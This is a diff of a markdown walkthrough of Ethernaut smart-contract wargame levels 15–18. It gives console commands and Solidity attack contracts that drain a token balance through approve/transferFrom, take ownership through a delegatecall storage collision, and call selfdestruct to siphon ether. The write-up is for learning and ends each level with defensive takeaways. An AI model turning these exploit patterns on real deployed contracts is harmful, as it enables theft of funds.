@@ -551,48 +551,60 @@ We can create zombie contracts by stopping a contract's initialization. Meaning,
 
 ## 15. Naught Coin
 
-Here we have a simple ERC-20 contract in our hands, that prevents us to transfer money to someone. However, this does not prevent us to approve that someone, and let them call transferFrom to take our money. That is precisely what we are going to do. We create and deploy a simple contract, Perhaps this is just to us developers to be careful when implementing the business logic and to ensure that other functions cannot somehow bypass it e.g. using `transferFrom` to bypass the `lockTokens` modifier on `transfer`.
-
-The solution is to just approve another address using the below contract;
+Here we have a simple ERC-20 contract in our hands, that prevents us to transfer money to someone. However, this is a bad implementation as the idea of this contract is to lock our tokens for 10 years, It overrides the `transfer()` method and the lockTokens modifier is being used to block us from transferring our tokens, but this does not prevent us to approve that someone, and let them call transferFrom to take our money. Cause from the NaughtCoin contract we can see that only the  `transfer()` function is guarded by the 10 years as all other ERC20 functions were not overridden including the famous `transferFrom()` :) That is precisely what we are going to do. We use the `approve()` to approve us the players in sending our token and the we use the `transferFrom` to milk the balance to zero.
+After getting our new instance we can check the balance using the first line from the codes written below, then we can also check the current allowance to know if we can use the `transferFrom` function to withdraw and of course at first we can't, so we approve with the third line, now we can use the `transferFrom` function.
 
 ```
-// SPDX-License-Identifier: GPL-3.0
-pragma solidity ^0.8.0;
+(await contract.balanceOf(player)).toString();
 
-import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/IERC20.sol";
+(await contract.allowance(player, player)).toString();
 
-contract NaughtWithdraw {
-  function withdrawFrom(address _tokenAddr, address _from, uint _amount) public {
-    bool success = IERC20(_tokenAddr).transferFrom(_from, address(this), _amount);
-    require(success, "failed!");
-  }
-}
+await contract.approve(player, "1000000000000000000000000");
+
+(await contract.allowance(player, player)).toString();
 ```
+Now since all has been approved we transfer the funds and the level is done
+```
+const value = "1000000000000000000000000";
+await contract.transferFrom(player, [another wallet], value);
+
+//Checking our balance again should return 0:
+
+(await contract.balanceOf(player)).toString();
+
+```
+
+On a side note, the comands used in the terminal for this level  are known as Immediately Invoked Function Expressions (IIFE), pretty interesting and would advise to check up on 
+https://www.geeksforgeeks.org/immediately-invoked-function-expressions-iife-in-javascript/
 
 MAIN TAKEAWAY FROM CHALLENGE:
 
 There are two ways to transfer tokens from an ERC20 token: by using the transfer() method, or performing a delegated transfer by using both approve() and transferFrom() in conjunction with each other. With delegated transfers, an account can approve another account to send tokens on its behalf.
+Also while implementing ERC interfaces all available functins shoould be implemented to avoid vulnerablities like this among others, also newer protocols like ERC223, ERC827, ERC721 (used by Cryptokitties) advisable should be considered rather than older ones.
 
 
 
 ## 16. Preservation
-Here we need to understand how `delegatecall` works and how it affects storage variables on the calling contract to be able to solve this level. The given contract actually suffers from a bug, which we used as an exploit in the 6th level (Delegation). When we call setFirstTime, it actually overwrites the value in timeZone1Library storage variable!
+Here we need to understand how `delegatecall` works and how it affects storage variables on the calling contract to be able to solve this level. 
+For example when Contract A delegates a function call to Contract B then the B’s code is executed with storage of A and this storage is in the form of slot system, where in each slot can store 256 bits of data.
+The given contract for this ethernaut level actually suffers from a bug, which we used as an exploit in the 6th level (Delegation). Her when we call setFirstTime, it actually overwrites the value in timeZone1Library storage variable!
 
-In short, the `LibraryContract` is trying to modify the variable at index 0 but on the calling contract, index 0 is the address of `timeZone1Library`. So first you need to call `setTime()` to replace `timeZone1Library` with a malicious contract. In this malicious contract, `setTime()` which will modify index 3 which on the calling contract is the owner variable!
+In short, the `LibraryContract` is trying to modify the variable at index 0 but on the calling contract, index 0 is the address of `timeZone1Library`. So first you need to call `setFirstTime()` to replace `timeZone1Library` with a malicious contract. In this malicious contract, `setTime()` which will modify index 3 which on the calling contract is the owner variable!
 
-1. Deploy the malicious library contract
-2. Convert malicious contract address into uint.
-3. Call either `setFirstTime()` or `setSecondTime()` with the uint value of the malicious contract address (step 2)
-4. Now that the address of `timeZone1Library` has been modified to the malicious contract, get the uint value of your player address
-5. call `setFirstTime()` with the uint value of your player address.
+Note: it is important to use the same function name as in LibraryContract because Preservation.sol invokes functions by name:
+```
+bytes4(keccak256(“setTime(uint256)”));
+```
+
+Using the contract below owning this contract can be acheived.
 ```
 pragma solidity ^0.8.0;
 
 contract PreservationAttack {
 
     // stores a timestamp
-    address doesNotMatterWhatThisIsOne;
-    address doesNotMatterWhatThisIsTwo;
+    address MalicioustimeZone1Library;
+    address MalicioustimeZone2Library;
     address maliciousIndex;
 
     function setTime(uint _time) public {
@@ -605,70 +617,148 @@ await contract.setFirstTime("<insert the uint value of your player>)
 
 ```
 MAIN TAKEAWAY FROM CHALLENGE:
-Quoting the author's message: "This example demonstrates why the library keyword should be used for building libraries, as it prevents the libraries from storing and accessing state variables."
+Do not forget that ideally, libraries should not store state and quoting the author's message: "This example demonstrates why the library keyword should be used for building libraries, as it prevents the libraries from storing and accessing state variables."
 
 The order in which we list state variables in a contract correspond to slots in storage, and require particular attention when using delegatecall.
+A great explanation on topics related to how this level is solved can be found on here https://medium.com/coinmonks/ethernaut-lvl-16-preservation-walkthrough-how-to-inject-malicious-contracts-with-delegatecall-81e071f98a12
 
 
 ## 17. Recovery
-Contract addresses are deterministic and are calculated by keccack256(RLP_encode(address, nonce)). The nonce for a contract is the number of contracts it has created. All nonce's are 0 for contracts, but they become 1 once they are created (the completion of the creation makes the nonce 1).
-We might need to read more about Read about RLP encoding in the Ethereum docs https://ethereum.org/en/developers/docs/data-structures-and-encoding/rlp/. We want the RLP encoding of a 20 byte address and a nonce value of 1, which corresponds to the list such as [<20 byte string>, <1 byte integer>].
-For the string:
-if a string is 0-55 bytes long, the RLP encoding consists of a single byte with value 0x80 (dec. 128) plus the length of the string followed by the string. The range of the first byte is thus 0x80, 0xb7.
+Solving this level we need to figure two things out, first the address of the new contract and then secondly we call the `selfdestruct()` function and transfer all the funds to any address we chose.
+After reading the solidity docs, we know that contract addresses are deterministic and are calculated by `keccack256(RLP_encode(address, nonce))`. The nonce for a contract is the number of contracts it has created. All nonce's are 0 for contracts, but they become 1 once they are created (the completion of the creation makes the nonce 1). So here we need the creator address and the nonce, since we already know the recovery address, which in this case is our level instance address, we can calculate the contract address using this and the nonce, the nonce here is going to be one cause the receovery contract has gone through only one transaction.
+We might need to read more about Read about RLP encoding in the Ethereum docs 
+An easier way is to use etherscan to find out our generated contract address, since we already have our instance address we can go on etherscan and find out the address of the generated contract, now for this level after generating a new instance we can see that there are five transactions atttached:
+- First, we send 0.001 ETH to the Ethernaut contract
+- Which will create the Recovery contract for us
+- The `generateToken()` method is called
+- The SimpleToken contract is then created and we can get the address in this step
+- Lastly, 0.001 ETH is transfered to the SimpleToken contract
 
-For the list, with the string and the nonce in it:
-if the total payload of a list (i.e. the combined length of all its items being RLP encoded) is 0-55 bytes long, the RLP encoding consists of a single byte with value 0xc0 plus the length of the list followed by the concatenation of the RLP encodings of the items. The range of the first byte is thus 0xc0, 0xf7.
+Clicking on the address we can see that there is a balance of 0.001 ether that we need to siphon to pass the level
 
-This means that we will have:
+
+A function called `destroy()` exists which calls `selfdestruct()`. `selfdestruct()` is a way for us to "destroy" a contract and retrieve the entire eth balance at that address. So we can use the below contract to do that on remix, we just need to make sure that we've copied and imported the level's conract too to remix 
 ```
-[
-  0xC0
-    + 1 (a byte for string length) 
-    + 20 (string length itself) 
-    + 1 (nonce), 
-  0x80
-    + 20 (string length),
-  <20 byte string>,
-  <1 byte nonce>
-]
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+import "./SimpleToken.sol";
+contract Attack {
+    address payable me;
+    SimpleToken instance;
+    function attack(address payable originalContract) public {
+        me = payable(msg.sender); // or we can pass in our address instead of msg.sender, but same thing :)
+        instance = SimpleToken(originalContract); // instantiate the remote contract
+        instance.destroy(me); // call the method on the Token contract
+    }
+}
 ```
-In short: [0xD6, 0x94, <address>, 0x01]. We need to find the keccak256 of the packed version of this array, which we can find via:
 
-web3.utils.soliditySha3(
-  '0xd6',
-  '0x94',
-  // <instance address>,
-  '0x01'
-)
-The different when using soliditySha3 rather than sha3 is that this one will encode-packed the parameters like Solidity would; hashing afterwards. The last 20 bytes of the resulting digest will be the contract address! 
-
-A function called `destroy()` exists which calls `selfdestruct()`. `selfdestruct()` is a way for us to "destroy" a contract and retrieve the entire eth balance at that address. So what we need to do is encode it into the `data` payload initiate a transaction to it. We need to analyse our transaction hash to determine the address of the lost contract. Once we have that, this level is solved.
+Easy way explained above already that's by using etherscan to look for the new generated address, so another way to get the new generated contract address as explained in this link https://ethereum.stackexchange.com/questions/98700/find-address-of-a-contract-before-deployment-in-hardhat-and-ethers-js
+That's by running this script on node we precalculate the address of the token contract, where we pass the level's instance address to `from`
 ```
-data = web3.eth.abi.encodeFunctionCall({
-    name: 'destroy',
-    type: 'function',
-    inputs: [{
-        type: 'address',
-        name: '_to'
-    }]
-}, [player]);
-await web3.eth.sendTransaction({
-    to: "<insert the address of the lost contract>",
-    from: player,
-    data: data
-})
+const { getContractAddress } = require("@ethersproject/address");
+
+const futureAddress = getContractAddress({
+    from: "0xfbC9ddF2BBfAf7A274Da8155903be18D20b9C4d5",
+    nonce: 1,
+});
+
+console.log(futureAddress);
 ```
 MAIN TAKEAWAY FROM CHALLENGE:
 
-Smart Contract addresses are computed deterministically.  So if we lose a contract's address, we can retrieve it by computing the result of a deterministic formula.  Or if we have the address of the Externally Owned Account that created the contract, we can use Etherscan and find the contract's address there.
-
-Deterministic formula:
+Smart Contract addresses are computed deterministically and can be predicted in advance.  So if we lose a contract's address, we can retrieve it by computing the result of a deterministic formula.  Or if we have the address of the Externally Owned Account that created the contract, we can use Etherscan and find the contract's address there.
+Advisably to check up on how the RLP-encoding works.
+Below is the deterministic formula:
 
 lostAddress = rightmost_20_bytes(keccak(RLP(senderAddress, nonce)));
 
 ## 18. MagicNumber
 This level is not really a security challenge but rather it just teaches us the basics of the Ethereum Virtual Machine (EVM) like bytecode and opcodes, and how contracts get created when first deployed.
-checkt this "https://dev.to/erhant/ethernaut-18-magic-number-1iah" by Erhan Tezcan for more explanation
+What happens while initialising a contract?
+First things first, an EOA or contract sends a transaction to the Ethereum network. This transaction contains data, but no recipient address. This indicates to the EVM that the request is that of a contract creation, not a regular send/call transaction.
+Second, the EVM compiles the contract code in Solidity (a high level, human readable language) into bytecode (a low level, machine readable language). This bytecode directly translates into opcodes, which are executed in a single call stack.
+Important to note that contract creation bytecode contains both 1)initialization code and 2) the contract’s actual runtime code, concatenated in sequential order.
+While a contract is being created, the EVM only executes the initialization code until it reaches the first STOP or RETURN instruction in the stack. During this stage, the contract’s constructor() function is run, and the contract has an address.
+After this initialization code is run, only the runtime code remains on the stack. These opcodes are then copied into memory and returned to the EVM.
+Finally, the EVM stores this returned, surplus code in the state storage, in association with the new contract address. This is the runtime code that will be executed by the stack in all future calls to the new contract.
+
+So in order to solve this level, we need to set of opcodes, which are the 
+- Initialization opcodes: These are run immediately by the EVM to create and store our the future runtime opcodes.
+
+
+- Runtime opcodes: This opcode contains the actual execution logic that's needed, And this is the main part of our code thay should return 0x `0x42` and still be under 10 opcodes.
+
+By firstly figuring out the runtime code logic. The level constrains us to only 10 opcodes. Luckily, to return 0x42 we do not need more than that.
+
+Returning values is handled by the `RETURN` opcode, which takes in two arguments:
+
+p: the position where our value is stored in memory, i.e. 0x0, 0x40, 0x50. Let’s arbitrarily pick the 0x80 slot.
+s: the size of our stored data. Recall our value is 32 bytes long (or 0x20 in hex).
+Ethereum memory looks like this, with 0x0, 0x10, 0x20… as the official position references:
+
+
+Now this brings us to a point whwere we find out that before we can return a value, first youwe have to store it in memory.
+
+So first we store our 0x42 value in memory with mstore(p, v), where p is position and v is the value in hexadecimal:
+6042    // v: push1 0x42 (value is 0x42)
+6080    // p: push1 0x80 (memory slot is 0x80)
+52      // mstore
+2. Then, we can return this the 0x42 value:
+
+6020    // s: push1 0x20 (value is 32 bytes in size)
+6080    // p: push1 0x80 (value was stored in slot 0x80)
+f3      // return
+This resulting opcode sequence should be 604260805260206080f3. Our runtime opcode is exactly 10 opcodes and 10 bytes long.
+
+Initialization Opcodes — Part 2
+Creating the contract initialization opcodes. We need to know that these opcodes need to replicate our runtime opcodes to memory, before returning them to the EVM. Recall that the EVM will then automatically save the runtime sequence 604260805260206080f3 to the blockchain — we won’t have to handle this last part.
+
+Copying code from one place to another is handled by the opcode `codecopy`, which takes in 3 arguments:
+
+t: the destination position of the code, in memory. Let’s arbitrarily save the code to the 0x00 position.
+f: the current position of the runtime opcodes, in reference to the entire bytecode. Remember that f starts after initialization opcodes end. This value is currently unknown to us.
+s: size of the code, in bytes. Recall that 604260805260206080f3 is 10 bytes long (or 0x0a in hex).
+3. First we copy our runtime opcodes into memory. Add a placeholder for f, as it is currently unknown:
+
+600a    // s: push1 0x0a (10 bytes)
+60??    // f: push1 0x?? (current position of runtime opcodes)
+6000    // t: push1 0x00 (destination memory index 0)
+39      // CODECOPY
+4. Then, return your in-memory runtime opcodes to the EVM:
+
+600a    // s: push1 0x0a (runtime opcode length)
+6000    // p: push1 0x00 (access memory index 0)
+f3      // return to EVM
+5. Notice that in total, our initialization opcodes take up 12 bytes, or 0x0c spaces. This means our runtime opcodes will start at index 0x0c, where f is now known to be 0x0c:
+
+600a    // s: push1 0x0a (10 bytes)
+600c    // f: push1 0x?? (current position of runtime opcodes)
+6000    // t: push1 0x00 (destination memory index 0)
+39      // CODECOPY
+6. The final sequence is thus:
+
+0x600a600c600039600a6000f3604260805260206080f3
+Where the first 12 bytes are initialization opcodes and the subsequent 10 bytes are your runtime opcodes.
+
+So in our terminal we pass the final sequence as our bytecode to get the address needed to pass into`setSolver()`
+```
+> var bytecode = "0x600a600c600039600a6000f3604260805260206080f3";
+> web3.eth.sendTransaction({ from: account, data: bytecode }, function(err,res){console.log(res)});
+```
+Finally, we simply input the following to pass the level:
+```
+await contract.setSolver("contract address");
+```
+
+Resources to try to check on:
+Opcodes and bytecodes in solidity https://medium.com/@blockchain101/solidity-bytecode-and-opcode-basics-672e9b1a88c2
+
+6 parts to destructuring a solidity contract https://blog.openzeppelin.com/deconstructing-a-solidity-contract-part-i-introduction-832efd2d7737/
+
+S/O https://medium.com/coinmonks/ethernaut-lvl-19-magicnumber-walkthrough-how-to-deploy-contracts-using-raw-assembly-opcodes-c50edb0f71a2 and https://listed.to/@r1oga/13786/ethernaut-levels-16-to-18 for the detailed explanatikon on how to solve this level.
+
+
 
 ## 19. AlienCodex
 In order to solve this level, we need to understand about 3 things:
